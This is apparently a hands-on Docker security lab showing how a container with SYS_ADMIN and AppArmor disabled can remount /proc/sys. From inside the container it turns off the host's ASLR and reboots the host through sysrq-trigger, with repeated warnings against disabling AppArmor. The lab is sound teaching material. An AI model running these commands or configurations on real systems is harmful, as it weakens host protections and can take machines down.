### Unprivileged container, with capabilities and no AppArmor

Now let's try to run a container in an unprivileged mode, but add some capabilities.  

```
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor:unconfined ubuntu
```

As we have seen from the slides, AppArmomr is configured by default and limits the access to certain dangerous paths.
Here an example of what can go wrong when you disable and uninstall AppArmor.  
(This is done temporarely for this container only - needless to say NEVER EVER DO THIS EVER!)

Try now from the container to change its hostname

```
sysctl kernel.hostname=Hacked
```

You should get an error: `sysctl: setting key "kernel.hostname": Read-only file system`

This is Docker that by default rightfully sets the `/proc` virtual filesystem to read-only.  

#### Leveraging the capabilities

Try now to remount the filesystem with RW permissions:

```
mount -o rw,remount /proc/sys
```

(We just need the /proc/sys part to be writable)

and try again:  

```
sysctl kernel.hostname=Hacked
```

Which hostname was changed ? The container one or the host one ?  
Find that out by using the `hostname` command line.  

Why is that ?  
If you recall from the slides there is a namespace called `UTS` which isolates the hostname information.

#### Not everything is namespaced

From the *HOST* check the status of the ASLR via: 

```
cat /proc/sys/kernel/randomize_va_space

0 – No randomization. Everything is static.

2 – Full randomization. In addition to elements listed in the previous point, memory managed through brk() is also randomized.
```

Say you have a zero day exploit, but it works only when ALSR is disabled.  
Since not everything is namespaced and there are some dangerous path mounted in `/proc` we can easily do that, from the container, via  

```
echo 0 | tee /proc/sys/kernel/randomize_va_space
```

Now check it again on the linux host:

```
cat /proc/sys/kernel/randomize_va_space
```

Yep! ASLR is disabled now!

AppArmor is really helping in this regard.  
Once more: DO NOT DISABLE IT EVER.

#### Reboot host

But disabling ASLR is not the only attack one can do, how about rebooting the whole machine ?

```
echo 1 > /proc/sys/kernel/sysrq
```

Now just send the reboot signal....

```
mount -o rw,remount /proc/sysrq-trigger
echo b > /proc/sysrq-trigger
```

